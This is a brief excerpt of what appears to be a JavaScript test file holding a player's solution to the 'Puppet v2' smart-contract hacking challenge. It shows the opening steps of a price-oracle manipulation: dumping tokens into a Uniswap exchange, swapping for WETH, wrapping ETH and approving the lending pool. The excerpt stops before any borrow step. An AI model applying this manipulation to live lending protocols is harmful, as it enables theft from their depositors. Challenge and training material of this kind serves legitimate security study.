...
describe('[Challenge] Puppet v2', function () {
  ...
  it('Execution', async function () {
    ...
    await token.connect(player).transfer(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await uniswapExchange.connect(player).swap(0, parseEther('9.9'), player.address, '0x');
    await weth.connect(player).deposit({ value: parseEther('19.85') });
    await weth.connect(player).approve(lendingPool.address, parseEther('29.75')); //received 9.9+ weth from swap and 19.85 from deposit
